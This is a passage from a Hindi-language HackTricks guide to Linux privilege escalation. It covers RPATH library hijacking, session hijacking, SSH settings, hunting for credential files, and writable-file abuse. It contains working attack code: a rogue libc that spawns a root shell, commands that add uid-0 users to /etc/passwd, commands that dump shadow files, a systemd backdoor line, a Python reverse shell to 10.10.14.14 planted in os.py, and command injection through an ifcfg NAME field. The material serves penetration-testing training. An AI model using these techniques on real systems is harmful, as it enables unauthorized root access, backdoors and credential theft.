0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
लिब को `/var/tmp/flag15/` में कॉपी करने से यह प्रोग्राम द्वारा `RPATH` वेरिएबल में निर्दिष्ट स्थान पर इस्तेमाल किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक दुष्ट पुस्तकालय बनाएं `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ (Capabilities)

Linux क्षमताएँ एक प्रक्रिया को **root विशेषाधिकारों का एक उपसमूह प्रदान करती हैं**। यह प्रभावी रूप से root **विशेषाधिकारों को छोटी और विशिष्ट इकाइयों में विभाजित करता है**। प्रत्येक इकाई को फिर स्वतंत्र रूप से प्रक्रियाओं को प्रदान किया जा सकता है। इस तरह से विशेषाधिकारों का पूरा सेट कम हो जाता है, शोषण के जोखिमों को कम करता है।\
निम्नलिखित पृष्ठ को पढ़ें ताकि **क्षमताओं के बारे में और उनका दुरुपयोग कैसे करें यह जान सकें**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **"execute" के लिए बिट** का तात्पर्य है कि प्रभावित उपयोगकर्ता "**cd**" का उपयोग करके फोल्डर में प्रवेश कर सकता है।\
**"read"** बिट का तात्पर्य है उपयोगकर्ता **फाइलों की सूची बना सकता है**, और **"write"** बिट का तात्पर्य है उपयोगकर्ता **फाइलों को हटा** और नई **फाइलें बना** सकता है।

## ACLs

ACLs (एक्सेस कंट्रोल लिस्ट्स) विवेकाधीन अनुमतियों का दूसरा स्तर हैं, जो **मानक ugo/rwx को ओवरराइड कर सकते हैं**। जब सही ढंग से इस्तेमाल किया जाता है तो वे आपको एक फाइल या डायरेक्टरी के लिए पहुँच सेट करने में **बेहतर ग्रेन्युलैरिटी प्रदान कर सकते हैं**, उदाहरण के लिए एक विशिष्ट उपयोगकर्ता को पहुँच देना या इनकार करना जो न तो फाइल का मालिक है और न ही समूह का मालिक (यहाँ से [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)).\
**दें** उपयोगकर्ता "kali" को एक फाइल पर पढ़ने और लिखने की अनुमतियाँ:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से विशिष्ट ACLs वाली फाइलें प्राप्त करें:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## ओपन शेल सेशन्स

**पुराने संस्करणों** में आप किसी अन्य उपयोगकर्ता (**रूट**) के **शेल** सेशन को **हाइजैक** कर सकते हैं।\
**नवीनतम संस्करणों** में आप केवल **अपने उपयोगकर्ता** के स्क्रीन सेशन्स से **जुड़** सकेंगे। हालांकि, आपको सेशन के अंदर **रोचक जानकारी मिल सकती है**।

### स्क्रीन सेशन्स हाइजैकिंग

**स्क्रीन सेशन्स की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
```markdown
![](<../../.gitbook/assets/image (130).png>)

**सत्र से जुड़ें**
```
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux सत्रों का हाइजैकिंग

यह **पुराने tmux संस्करणों** के साथ एक समस्या थी। मैं एक गैर-विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में root द्वारा बनाए गए tmux (v2.1) सत्र को हाइजैक नहीं कर पाया था।

**tmux सत्रों की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
```markdown
![](<../../.gitbook/assets/image (131).png>)

**सत्र से जुड़ें**
```
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
उदाहरण के लिए **Valentine box from HTB** देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 से 13 मई 2008 तक Debian आधारित सिस्टम्स (Ubuntu, Kubuntu, आदि) पर उत्पन्न सभी SSL और SSH कुंजियाँ इस बग से प्रभावित हो सकती हैं।\
यह बग उन OS में एक नई ssh कुंजी बनाते समय होता है, क्योंकि **केवल 32,768 विविधताएं संभव थीं**। इसका मतलब है कि सभी संभावनाओं की गणना की जा सकती है और **ssh सार्वजनिक कुंजी होने पर आप संबंधित निजी कुंजी की खोज कर सकते हैं**। आप गणना की गई संभावनाओं को यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH दिलचस्प कॉन्फ़िगरेशन मान

* **PasswordAuthentication:** निर्दिष्ट करता है कि पासवर्ड प्रमाणीकरण की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
* **PubkeyAuthentication:** निर्दिष्ट करता है कि सार्वजनिक कुंजी प्रमाणीकरण की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
* **PermitEmptyPasswords:** जब पासवर्ड प्रमाणीकरण की अनुमति होती है, तो यह निर्दिष्ट करता है कि सर्वर खाली पासवर्ड स्ट्रिंग्स वाले खातों में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

* `yes`: root पासवर्ड और निजी कुंजी का उपयोग करके लॉगिन कर सकता है
* `without-password` या `prohibit-password`: root केवल निजी कुंजी के साथ लॉगिन कर सकता है
* `forced-commands-only`: Root केवल निजी कुंजी का उपयोग करके और यदि कमांड विकल्प निर्दिष्ट हैं तो लॉगिन कर सकता है
* `no` : नहीं

### AuthorizedKeysFile

निर्दिष्ट करता है कि उपयोगकर्ता प्रमाणीकरण के लिए कौन सी फ़ाइलें सार्वजनिक कुंजियाँ रख सकती हैं। इसमें `%h` जैसे टोकन हो सकते हैं, जिन्हें घर की निर्देशिका से बदल दिया जाएगा। **आप निरपेक्ष पथ** (जो `/` में शुरू होते हैं) या **उपयोगकर्ता के घर से सापेक्ष पथ** इंगित कर सकते हैं। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
### ForwardAgent/AllowAgentForwarding

SSH agent forwarding की अनुमति देता है कि आप अपनी स्थानीय SSH कुंजियों का उपयोग करें बजाय इसके कि कुंजियों को (बिना पासफ्रेज़ के!) आपके सर्वर पर छोड़ दें। इसलिए, आप ssh के माध्यम से एक होस्ट पर **कूद** पाएंगे और वहां से दूसरे होस्ट पर **कूदने** में सक्षम होंगे **उपयोग करते हुए** **कुंजी** जो आपके **प्रारंभिक होस्ट** में स्थित है।

आपको इस विकल्प को `$HOME/.ssh.config` में इस तरह सेट करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता एक अलग मशीन पर जाता है, उस होस्ट को कीज़ तक पहुँचने की अनुमति होगी (जो कि एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इस **विकल्पों** को **ओवरराइड** कर सकती है और इस कॉन्फ़िगरेशन को अनुमति या अस्वीकार कर सकती है।\
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` कीवर्ड के साथ ssh-agent फॉरवर्डिंग को **अनुमति** या **अस्वीकार** कर सकती है (डिफ़ॉल्ट अनुमति है)।

यदि आप पाते हैं कि फॉरवर्ड एजेंट को एक वातावरण में कॉन्फ़िगर किया गया है तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप इसका दुरुपयोग करके विशेषाधिकार बढ़ा सकते हैं**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें **स्क्रिप्ट्स हैं जो नया शेल चलाने पर उपयोगकर्ता द्वारा निष्पादित की जाती हैं**। इसलिए, यदि आप उनमें से किसी को भी **लिख सकते हैं या संशोधित कर सकते हैं तो आप विशेषाधिकार बढ़ा सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफाइल स्क्रिप्ट मिलती है, तो आपको उसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### Passwd/Shadow फाइलें

ऑपरेटिंग सिस्टम के आधार पर `/etc/passwd` और `/etc/shadow` फाइलें अलग नाम से हो सकती हैं या उनका बैकअप हो सकता है। इसलिए यह सिफारिश की जाती है कि **सभी को ढूंढें** और **जांचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि देख सकें कि क्या फाइलों के अंदर **हैशेज हैं**।
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ अवसरों पर आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांड्स में से एक के साथ एक पासवर्ड जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर उपयोगकर्ता `hacker` को जोड़ें और उत्पन्न किया गया पासवर्ड जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
```markdown
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं।

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कम कर सकते हैं।
```
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ध्यान दें: BSD प्लेटफॉर्म्स में `/etc/passwd` को `/etc/pwd.db` और `/etc/master.passwd` पर स्थित किया गया है, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको जांचना चाहिए कि क्या आप **कुछ संवेदनशील फाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat सेवा कॉन्फ़िगरेशन फ़ाइल को संशोधित कर सकते हैं,** तो आप निम्नलिखित पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### फोल्डर्स की जाँच करें

निम्नलिखित फोल्डर्स में बैकअप्स या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups**, **/var/mail**, **/var/spool/mail**, **/etc/exports**, **/root** (संभवतः आप अंतिम वाले को पढ़ नहीं पाएंगे लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/स्वामित्व वाली फाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_इतिहास, .sudo\_as\_admin\_successful, प्रोफ़ाइल, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में स्क्रिप्ट/बाइनरीज**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **वेब फाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ज्ञात फाइलें जिनमें पासवर्ड होते हैं

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कई संभावित फाइलों की खोज करता है जिनमें पासवर्ड हो सकते हैं**।\
**एक और दिलचस्प उपकरण** जिसका आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन सोर्स एप्लिकेशन है जिसका उपयोग Windows, Linux & Mac पर स्थानीय कंप्यूटर पर संग्रहीत बहुत सारे पासवर्ड पुनः प्राप्त करने के लिए किया जाता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें **रोचक/गोपनीय जानकारी पा सकते हैं**। जितना अजीब लॉग होगा, उतना ही वह (शायद) रोचक होगा।\
साथ ही, कुछ "**खराब**" कॉन्फ़िगर किए गए (बैकडोर्ड?) **ऑडिट लॉग्स** आपको इस पोस्ट में बताए गए अनुसार ऑडिट लॉग्स में **पासवर्ड रिकॉर्ड करने** की अनुमति दे सकते हैं: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
के लिए **लॉग्स पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/#adm-group) वास्तव में सहायक होगा।

### शेल फाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### सामान्य क्रेड्स खोज/Regex

आपको फाइलों की जांच करनी चाहिए जिनके **नाम** में या **सामग्री** के अंदर "**password**" शब्द हो, साथ ही लॉग्स में आईपी और ईमेल्स की जांच करनी चाहिए, या हैशेज regexps की भी।\
मैं यहां यह सब कैसे करना है इसकी सूची नहीं दे रहा हूँ, लेकिन अगर आप इच्छुक हैं तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए गए अंतिम जांचों को देख सकते हैं।

## लिखने योग्य फाइलें

### Python लाइब्रेरी हाइजैकिंग

यदि आप जानते हैं कि **कहां से** एक python स्क्रिप्ट को निष्पादित किया जाने वाला है और आप उस फोल्डर के अंदर **लिख सकते हैं** या आप python लाइब्रेरीज को **संशोधित कर सकते हैं**, तो आप OS लाइब्रेरी को संशोधित करके उसमें बैकडोर लगा सकते हैं (यदि आप python स्क्रिप्ट को निष्पादित करने वाले स्थान पर लिख सकते हैं, os.py लाइब्रेरी की प्रतिलिपि बनाएं और चिपकाएं)।

लाइब्रेरी में **बैकडोर जोड़ने** के लिए बस os.py लाइब्रेरी के अंत में निम्नलिखित पंक्ति जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

`logrotate` में एक कमजोरी है जो उस उपयोगकर्ता को, जिसके पास **लॉग फ़ाइल पर लिखने की अनुमति** है या **उसके किसी भी** **माता-पिता निर्देशिका** पर, `logrotate` को **किसी भी स्थान पर फ़ाइल लिखने** की अनुमति देती है। यदि **logrotate** **root** द्वारा निष्पादित किया जा रहा है, तो उपयोगकर्ता _**/etc/bash\_completion.d/**_ में कोई भी फ़ाइल लिख सकता है जो किसी भी उपयोगकर्ता द्वारा लॉगिन करने पर निष्पादित की जाएगी।\
इसलिए, यदि आपके पास **लॉग फ़ाइल** पर **लिखने की अनुमतियाँ** हैं **या** उसके किसी भी **माता-पिता फ़ोल्डर** पर, आप **privesc** कर सकते हैं (अधिकांश linux वितरणों पर, logrotate स्वचालित रूप से एक बार दिन में **user root** के रूप में निष्पादित होता है)। साथ ही, जांचें कि क्या _/var/log_ के अलावा और फ़ाइलें **rotated** हो रही हैं।

{% hint style="info" %}
यह कमजोरी `logrotate` संस्करण `3.18.0` और पुराने को प्रभावित करती है
{% endhint %}

इस कमजोरी के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर पाई जा सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमजोरी का शोषण [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह कमजोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** से बहुत समान है, इसलिए जब भी आप पाते हैं कि आप लॉग्स को बदल सकते हैं, जांचें कि कौन उन लॉग्स को प्रबंधित कर रहा है और जांचें कि क्या आप सिम्लिंक्स के द्वारा लॉग्स को प्रतिस्थापित करके विशेषाधिकार बढ़ा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

यदि, किसी भी कारण से, एक उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **लिखने** में सक्षम है **या** वह किसी मौजूदा को **समायोजित** कर सकता है, तो आपका **सिस्टम pwned है**।

नेटवर्क स्क्रिप्ट्स, _ifcg-eth0_ उदाहरण के लिए, नेटवर्क कनेक्शनों के लिए उपयोग किए जाते हैं। वे बिल्कुल .INI फ़ाइलों की तरह दिखते हैं। हालांकि, वे Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ होते हैं।

मेरे मामले में, इन नेटवर्क स्क्रिप्ट्स में `NAME=` विशेषता को सही ढंग से संभाला नहीं जाता है। यदि आपके पास **नाम में सफेद/खाली जगह है तो सिस्टम सफेद/खाली जगह के बाद के हिस्से को निष्पादित करने की कोशिश करता है**। इसका मतलब है कि **पहली खाली जगह के बाद की सभी चीजें root के रूप में निष्पादित की जाती हैं**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_नोट: Network और /bin/id के बीच खाली जगह का ध्यान दें_)

**वल्नरेबिलिटी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd, और rc.d**

`/etc/init.d` में **स्क्रिप्ट्स** होती हैं जिनका उपयोग System V init टूल्स (SysVinit) द्वारा किया जाता है। यह **लिनक्स के लिए पारंपरिक सेवा प्रबंधन पैकेज** है, जिसमें `init` प्रोग्राम (कर्नेल के इनिशियलाइजिंग¹ पूरा होने के बाद चलने वाली पहली प्रक्रिया) के साथ-साथ कुछ इंफ्रास्ट्रक्चर भी शामिल हैं जो सेवाओं को शुरू और बंद करने और उन्हें कॉन्फ़िगर करने के लिए होते हैं। विशेष रूप से, `/etc/init.d` में फाइलें शेल स्क्रिप्ट्स होती हैं जो `start`, `stop`, `restart`, और (जब समर्थित हो) `reload` कमांड्स का जवाब देती हैं ताकि किसी विशेष सेवा का प्रबंधन किया जा सके। इन स्क्रिप्ट्स को सीधे या (अधिकतर) किसी अन्य ट्रिगर के माध्यम से आमंत्रित किया जा सकता है (आमतौर पर `/etc/rc?.d/` में एक प्रतीकात्मक लिंक की उपस्थिति)। (यहाँ से [यहाँ](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))। इस फोल्डर का अन्य विकल्प Redhat में `/etc/rc.d/init.d` है।

`/etc/init` में **कॉन्फ़िगरेशन** फाइलें होती हैं जिनका उपयोग **Upstart** द्वारा किया जाता है। Upstart एक नया **सेवा प्रबंधन पैकेज** है जिसे Ubuntu द्वारा प्रोत्साहित किया गया है। `/etc/init` में फाइलें कॉन्फ़िगरेशन फाइलें होती हैं जो Upstart को बताती हैं कि किसी सेवा को कब और कैसे `start`, `stop`, `reload` कॉन्फ़िगरेशन, या सेवा की `status` क्वेरी करनी है। lucid के रूप में, Ubuntu SysVinit से Upstart में संक्रमण कर रहा है, जो बताता है कि क्यों कई सेवाएँ SysVinit स्क्रिप्ट्स के साथ आती हैं भले ही Upstart कॉन्फ़िगरेशन फाइलें प्राथमिकता होती हैं। SysVinit स्क्रिप्ट्स को Upstart में एक संगतता परत द्वारा संसाधित किया जाता है। (यहाँ से [यहाँ](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))।

**systemd** एक **लिनक्स इनिशियलाइजेशन सिस्टम और सेवा प्रबंधक** है जिसमें डेमन्स की ऑन-डिमांड शुरुआत, माउंट और ऑटोमाउंट पॉइंट रखरखाव, स्नैपशॉट समर्थन, और प्रक्रियाओं की ट्रैकिंग जैसी विशेषताएँ शामिल हैं जो लिनक्स कंट्रोल ग्रुप्स का उपयोग करती हैं। systemd एक लॉगिंग डेमन और अन्य टूल्स और यूटिलिटीज प्रदान करता है जो सामान्य सिस्टम प्रशासन कार्यों में मदद करते हैं। (यहाँ से [यहाँ](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/))।

वितरण रिपॉजिटरी से डाउनलोड किए गए पैकेजों में शिप की गई फाइलें `/usr/lib/systemd/` में जाती हैं। सिस्टम प्रशासक (उपयोगकर्ता) द्वारा किए गए संशोधन `/etc/systemd/system/` में जाते हैं।

## अन्य ट्रिक्स

### NFS Privilege escalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### सीमित Shells से बचना

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## कर्नेल सुरक्षा संरक्षण

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## अधिक मदद

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc टूल्स

### **Linux स्थानीय privilege escalation वेक्टर्स के लिए सर्वश्रेष्ठ टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t विकल्प)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** लिनक्स और MAC में कर्नेल वल्न्स का पता लगाएं [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (भौतिक पहुँच):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**अधिक स्क्रिप्ट्स का संकलन**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
